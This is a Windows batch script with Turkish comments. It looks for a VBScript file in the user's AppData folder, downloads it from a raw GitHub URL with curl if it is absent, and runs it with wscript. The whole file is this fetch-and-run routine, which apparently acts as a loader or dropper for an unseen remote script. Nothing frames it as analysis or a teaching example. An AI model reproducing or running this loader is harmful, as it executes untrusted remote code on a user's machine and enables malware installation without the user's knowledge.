@echo off
set "vbsfile=%APPDATA%\loa.vbs"

:: VBS dosyası var mı kontrol et
if exist "%vbsfile%" (
    echo [*] Dosya bulundu: %vbsfile%
    wscript "%vbsfile%"
) else (
    echo [!] Dosya bulunamadı. İndiriliyor...
    curl -L -o "%vbsfile%" "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/loa.vbs"
    if exist "%vbsfile%" (
        echo [+] Indirme basarili. Calistiriliyor...
        wscript "%vbsfile%"
    ) else (
        echo [-] Indirme basarisiz.
    )
)

